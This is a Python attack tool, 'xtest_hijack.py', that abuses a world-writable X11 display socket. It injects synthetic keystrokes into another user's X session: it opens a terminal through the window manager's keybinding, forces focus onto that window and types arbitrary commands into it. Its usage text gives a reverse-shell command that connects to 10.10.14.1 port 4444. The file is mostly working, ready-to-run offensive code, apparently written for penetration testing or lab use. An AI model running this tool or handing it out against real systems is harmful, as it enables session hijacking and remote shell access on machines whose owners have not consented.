#!/usr/bin/env python3
"""
xtest_hijack.py

A small tool to abuse an over-permissive X11 display socket (e.g. a
world-writable /tmp/.X11-unix/X<N>) in order to:

  1. Synthesize a window-manager keybinding (default: Ctrl+Alt+T) via the
     XTEST extension, to spawn a terminal on someone else's active X
     session.
  2. Locate that exact terminal window by its process PID (reliable even
     when several xterm windows are already open on the display), force
     keyboard focus and stacking order onto it, and type an arbitrary
     command into it, character by character -- correctly handling
     punctuation and shifted characters.

This is deliberately kept close to a manual, two-step workflow (spawn,
then type) because forcing input focus on an X11 window that belongs to
another client is timing-sensitive: a kiosk browser or the window manager
itself can re-assert focus a moment later. Re-running the --type step
(with --focus-pid) is normal and expected if the first attempt doesn't
land.

Requires:
  - `python-xlib` (pip install python-xlib)
  - Run directly on the host that owns the target X display, with
    DISPLAY (and XAUTHORITY if required) pointing at it.
  - `pgrep` available on PATH (standard on virtually every Linux distro)
    to find the freshly spawned terminal's PID.

Usage:
    export DISPLAY=:0

    # Step 1: spawn a terminal via the WM's Ctrl+Alt+T binding, and
    # remember its PID
    python3 xtest_hijack.py --open-terminal

    # Step 2: focus that terminal and type a command into it
    python3 xtest_hijack.py --focus-pid <PID> --type "whoami"

    # Both in one go (spawn, focus the new window, type):
    python3 xtest_hijack.py --open-terminal \\
        --type "bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'"

    # If typing didn't land (focus got stolen), just retry the focus+type
    # step again -- the window is still there:
    python3 xtest_hijack.py --focus-pid <PID> --type "whoami"
"""

import argparse
import subprocess
import sys
import time

from Xlib import X, XK, display

try:
    from Xlib.ext import xtest
except ImportError:
    print("[!] python-xlib's XTEST extension is required: pip install python-xlib",
          file=sys.stderr)
    raise

# Characters that need an explicit X keysym *name* rather than their literal
# character -- XK.string_to_keysym() only understands keysym names, and for
# letters/digits the name happens to equal the character, but punctuation
# needs the real name (e.g. '-' -> 'minus', '/' -> 'slash').
CHAR_TO_KEYSYM_NAME = {
    " ": "space", "-": "minus", "_": "underscore", "/": "slash",
    ".": "period", ",": "comma", ":": "colon", ";": "semicolon",
    "'": "apostrophe", '"': "quotedbl", ">": "greater", "<": "less",
    "&": "ampersand", "(": "parenleft", ")": "parenright",
    "!": "exclam", "$": "dollar", "=": "equal", "+": "plus",
    "*": "asterisk", "#": "numbersign", "%": "percent", "@": "at",
    "^": "asciicircum", "~": "asciitilde", "`": "grave",
    "[": "bracketleft", "]": "bracketright", "{": "braceleft",
    "}": "braceright", "|": "bar", "\\": "backslash", "?": "question",
}


class XTestHijacker:
    def __init__(self, display_name=None):
        self.d = display.Display(display_name)
        self.root = self.d.screen().root

    # ---- low-level key events -------------------------------------------

    def key_event(self, keysym, press):
        keycode = self.d.keysym_to_keycode(keysym)
        if keycode == 0:
            print(f"[!] no keycode for keysym {keysym}", file=sys.stderr)
            return
        xtest.fake_input(self.d, X.KeyPress if press else X.KeyRelease, keycode)
        self.d.sync()

    def combo(self, *keysyms):
        for k in keysyms:
            self.key_event(k, True)
        time.sleep(0.1)
        for k in reversed(keysyms):
            self.key_event(k, False)

    def get_keysym(self, ch):
        if ch in CHAR_TO_KEYSYM_NAME:
            return XK.string_to_keysym(CHAR_TO_KEYSYM_NAME[ch])
        return XK.string_to_keysym(ch)

    def send_char(self, ch):
        keysym = self.get_keysym(ch)
        if not keysym:
            print(f"[!] no keysym for char: {ch!r}", file=sys.stderr)
            return
        keycode = self.d.keysym_to_keycode(keysym)
        if keycode == 0:
            print(f"[!] no keycode for char: {ch!r}", file=sys.stderr)
            return

        # Some characters only exist on the shifted level of their keycode
        # (e.g. '>' is Shift+period on most layouts) -- hold Shift if so.
        base = self.d.keycode_to_keysym(keycode, 0)
        need_shift = base != keysym

        if need_shift:
            shift_kc = self.d.keysym_to_keycode(XK.XK_Shift_L)
            xtest.fake_input(self.d, X.KeyPress, shift_kc)
            self.d.sync()

        xtest.fake_input(self.d, X.KeyPress, keycode)
        self.d.sync()
        xtest.fake_input(self.d, X.KeyRelease, keycode)
        self.d.sync()

        if need_shift:
            xtest.fake_input(self.d, X.KeyRelease, shift_kc)
            self.d.sync()

    def type_string(self, s, char_delay=0.03, press_enter=True):
        for ch in s:
            self.send_char(ch)
            time.sleep(char_delay)
        if press_enter:
            self.key_event(XK.XK_Return, True)
            self.key_event(XK.XK_Return, False)

    # ---- opening a terminal ----------------------------------------------

    def open_terminal_via_keybinding(self):
        """Send Ctrl+Alt+T (the default Openbox 'open terminal' binding)."""
        self.combo(XK.XK_Control_L, XK.XK_Alt_L, XK.XK_t)

    # ---- finding + focusing a window by PID -------------------------------

    def find_windows_by_pid(self, target_pid, win=None):
        """Recursively search the window tree for windows whose
        _NET_WM_PID property matches target_pid."""
        if win is None:
            win = self.root
        results = []
        try:
            pid_prop = win.get_full_property(
                self.d.intern_atom("_NET_WM_PID"), X.AnyPropertyType)
            if pid_prop and pid_prop.value[0] == target_pid:
                results.append(win)
        except Exception:
            pass
        try:
            for child in win.query_tree().children:
                results.extend(self.find_windows_by_pid(target_pid, child))
        except Exception:
            pass
        return results

    def focus_pid(self, target_pid):
        """Find the window(s) owned by target_pid, raise and focus them.
        No keyboard grab is forced -- just focus + stacking order, which
        is enough in practice and avoids interfering with the WM's own
        focus handling."""
        matches = self.find_windows_by_pid(target_pid)
        if not matches:
            print(f"[!] No window found for PID {target_pid}.", file=sys.stderr)
            return False
        for w in matches:
            w.set_input_focus(X.RevertToParent, X.CurrentTime)
            w.configure(stack_mode=X.Above)
            self.d.sync()
        print(f"[+] Focused {len(matches)} window(s) for PID {target_pid}.")
        return True


def pgrep_newest(process_name):
    """Return the most recently started PID matching process_name, or
    None. Relies on `pgrep -n`, which picks the newest match."""
    try:
        out = subprocess.check_output(["pgrep", "-n", process_name])
        return int(out.strip())
    except Exception:
        return None


def main():
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--display", default=None,
                         help="X display to connect to (defaults to $DISPLAY).")
    parser.add_argument("--open-terminal", action="store_true",
                         help="Send Ctrl+Alt+T to spawn a terminal via the WM keybinding.")
    parser.add_argument("--process-name", default="xterm",
                         help="Process name to look up with `pgrep -n` after "
                              "--open-terminal (default: xterm).")
    parser.add_argument("--focus-pid", type=int, default=None,
                         help="Focus an already-known PID instead of spawning "
                              "a new terminal (use this to retry typing into "
                              "a window you already opened).")
    parser.add_argument("--wait", type=float, default=2.0,
                         help="Seconds to wait after --open-terminal before "
                              "looking up its PID (default: 2.0).")
    parser.add_argument("--type", dest="command", default=None,
                         help="Command to type into the focused window.")
    parser.add_argument("--no-enter", action="store_true",
                         help="Don't press Return after typing.")
    args = parser.parse_args()

    hij = XTestHijacker(args.display)

    target_pid = args.focus_pid

    if args.open_terminal:
        print("[*] Sending Ctrl+Alt+T...")
        hij.open_terminal_via_keybinding()
        time.sleep(args.wait)
        target_pid = pgrep_newest(args.process_name)
        if target_pid is None:
            print(f"[!] Could not find a new '{args.process_name}' process "
                  "via pgrep. Is it actually spawning? Check 'ps aux' "
                  "manually.", file=sys.stderr)
            sys.exit(1)
        print(f"[+] New terminal PID: {target_pid}")

    if target_pid is not None:
        if not hij.focus_pid(target_pid):
            sys.exit(1)

    if args.command is not None:
        if target_pid is None:
            print("[!] No target window (use --open-terminal or --focus-pid "
                  "first).", file=sys.stderr)
            sys.exit(1)
        time.sleep(0.5)
        print(f"[*] Typing: {args.command!r}")
        hij.type_string(args.command, press_enter=not args.no_enter)
        print("[*] Done.")


if __name__ == "__main__":
    main()
